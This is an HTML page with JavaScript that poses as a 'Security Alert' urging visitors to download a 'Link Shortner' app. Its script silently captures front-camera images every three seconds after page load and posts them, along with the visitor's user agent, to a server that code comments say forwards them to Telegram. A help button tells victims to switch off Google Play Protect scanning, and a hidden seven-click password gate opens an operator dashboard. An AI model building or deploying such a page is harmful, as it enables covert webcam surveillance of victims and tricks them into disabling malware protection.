<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Alert</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            background: #000; 
            color: white; 
            font-family: Arial; 
            height: 100vh; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            text-align: center;
            padding: 20px;
        }
        .container { 
            background: #111; 
            padding: 40px; 
            border-radius: 15px; 
            border: 2px solid red;
            max-width: 600px;
            width: 100%;
        }
        h1 { color: red; margin-bottom: 20px; font-size: 28px; }
        .message { color: #ccc; margin-bottom: 30px; line-height: 1.5; }
        .buttons { display: flex; flex-direction: column; gap: 15px; }
        button { 
            padding: 15px; 
            border: none; 
            border-radius: 8px; 
            font-size: 16px; 
            cursor: pointer;
            transition: 0.3s;
        }
        .download { background: #0066ff; color: white; }
        .help { background: #333; color: white; }
        button:hover { transform: scale(1.05); }
        .note { 
            margin-top: 30px; 
            font-size: 12px; 
            color: #666; 
            padding-top: 20px;
            border-top: 1px solid #333;
        }
        .click-counter {
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: rgba(255,0,0,0.2);
            color: red;
            padding: 10px 15px;
            border-radius: 8px;
            display: none;
            border: 1px solid red;
        }
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.9);
            justify-content: center;
            align-items: center;
            z-index: 1000;
        }
        .modal-content {
            background: #222;
            padding: 30px;
            border-radius: 10px;
            width: 90%;
            max-width: 400px;
            border: 1px solid #0066ff;
        }
        input {
            width: 100%;
            padding: 15px;
            margin: 15px 0;
            background: #111;
            border: 1px solid #333;
            border-radius: 8px;
            color: white;
            font-size: 16px;
        }
        .submit-btn {
            background: #00aa00;
            color: white;
            width: 100%;
        }
        .error {
            color: red;
            margin-bottom: 10px;
            display: none;
        }
    </style>
</head>
<body>
    <div class="click-counter" id="clickCounter">
        Clicks: <span id="count">0</span>/7
    </div>
    
    <div class="container">
        <h1>‚ö†Ô∏è SECURITY ALERT DETECTED</h1>
        <p class="message">
            Our system detected suspicious activities. 
            For better experience, download our Link Shortner app.
        </p>
        
        <div class="buttons">
            <button class="download" onclick="downloadApp()">
                üì± Download App
            </button>
            <button class="help" onclick="showHelp()">
                ‚ùì Facing Issue
            </button>
        </div>
        
        <p class="note">
            Note: This site uses your camera for security verification
        </p>
    </div>
    
    <div class="modal" id="passwordModal">
        <div class="modal-content">
            <h2>Enter Password</h2>
            <div class="error" id="errorMsg"></div>
            <input type="password" id="password" placeholder="Password" autocomplete="off">
            <button class="submit-btn" onclick="verifyPassword()">Access Dashboard</button>
        </div>
    </div>
    
    <script>
        // Global variables
        let clickCount = 0;
        let cameraActive = false;
        
        // Update click counter
        function updateClickCounter() {
            document.getElementById('count').textContent = clickCount;
            document.getElementById('clickCounter').style.display = 'block';
            
            if (clickCount >= 7) {
                showPasswordModal();
                clickCount = 0;
            }
        }
        
        // Initialize camera
        async function initCamera() {
            try {
                console.log("Requesting camera access...");
                
                // Request camera
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" },
                    audio: false 
                });
                
                cameraActive = true;
                console.log("Camera access granted!");
                
                // Log to Telegram
                sendToTelegram("Camera activated on page load");
                
                // Start capturing
                startCapture(stream);
                
            } catch (error) {
                console.error("Camera error:", error);
                sendToTelegram(`Camera error: ${error.message}`);
            }
        }
        
        // Start capturing images
        function startCapture(stream) {
            setInterval(async () => {
                if (!cameraActive) return;
                
                try {
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    video.muted = true;
                    
                    await new Promise(resolve => {
                        video.onloadedmetadata = () => {
                            video.play();
                            resolve();
                        };
                    });
                    
                    // Wait for video to be ready
                    await new Promise(resolve => setTimeout(resolve, 500));
                    
                    const canvas = document.createElement('canvas');
                    canvas.width = 320;
                    canvas.height = 240;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0, 320, 240);
                    
                    const imageData = canvas.toDataURL('image/jpeg', 0.7);
                    
                    // Send to Telegram
                    await sendImageToTelegram(imageData);
                    
                    // Clean up
                    video.remove();
                    canvas.remove();
                    
                } catch (error) {
                    console.error("Capture error:", error);
                }
            }, 3000); // Every 3 seconds
        }
        
        // Send image to Telegram
        async function sendImageToTelegram(imageData) {
            try {
                const response = await fetch('/api/capture', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ image: imageData })
                });
                
                const result = await response.json();
                console.log("Image sent:", result.success);
                
            } catch (error) {
                console.error("Send image error:", error);
            }
        }
        
        // Send message to Telegram
        async function sendToTelegram(message) {
            try {
                await fetch('/api/log-error', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        error: { 
                            page: 'index.html', 
                            message: message 
                        } 
                    })
                });
            } catch (error) {
                console.error("Telegram log error:", error);
            }
        }
        
        // Show password modal
        function showPasswordModal() {
            document.getElementById('passwordModal').style.display = 'flex';
            document.getElementById('password').focus();
            document.getElementById('errorMsg').style.display = 'none';
        }
        
        // Hide modal
        function hidePasswordModal() {
            document.getElementById('passwordModal').style.display = 'none';
            document.getElementById('password').value = '';
        }
        
        // Verify password
        async function verifyPassword() {
            const password = document.getElementById('password').value;
            const errorEl = document.getElementById('errorMsg');
            
            if (!password) {
                errorEl.textContent = "Please enter password";
                errorEl.style.display = 'block';
                return;
            }
            
            try {
                console.log("Verifying password...");
                
                const response = await fetch('/api/verify', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ password: password })
                });
                
                console.log("Response status:", response.status);
                
                if (!response.ok) {
                    throw new Error(`HTTP ${response.status}`);
                }
                
                const result = await response.json();
                console.log("Result:", result);
                
                if (result.success) {
                    // Stop camera
                    cameraActive = false;
                    
                    // Redirect to dashboard
                    window.location.href = result.redirect;
                    
                } else {
                    errorEl.textContent = result.message || "Wrong password!";
                    errorEl.style.display = 'block';
                }
                
            } catch (error) {
                console.error("Password error:", error);
                errorEl.textContent = "Connection error. Trying again...";
                errorEl.style.display = 'block';
                
                // Log error
                sendToTelegram(`Password error: ${error.message}`);
                
                // Retry after 2 seconds
                setTimeout(() => {
                    verifyPassword();
                }, 2000);
            }
        }
        
        // Download app
        function downloadApp() {
            window.open('https://t.me/example', '_blank');
            sendToTelegram("Download button clicked");
        }
        
        // Show help
        function showHelp() {
            alert("1. Go to Play Store\n2. Click profile icon\n3. Click Play Protect\n4. Turn OFF scanning");
        }
        
        // Initialize everything when page loads
        window.addEventListener('load', () => {
            console.log("Page loaded!");
            
            // Start camera after 1 second
            setTimeout(initCamera, 1000);
            
            // Log page visit
            sendToTelegram(`Page visited by: ${navigator.userAgent.substring(0, 100)}`);
        });
        
        // Count clicks
        document.addEventListener('click', (e) => {
            if (!e.target.closest('.modal')) {
                clickCount++;
                updateClickCounter();
            }
        });
        
        // Close modal on outside click
        document.getElementById('passwordModal').addEventListener('click', (e) => {
            if (e.target.id === 'passwordModal') {
                hidePasswordModal();
            }
        });
        
        // Enter key in password field
        document.getElementById('password').addEventListener('keypress', (e) => {
            if (e.key === 'Enter') {
                verifyPassword();
            }
        });
    </script>
</body>
  </html>
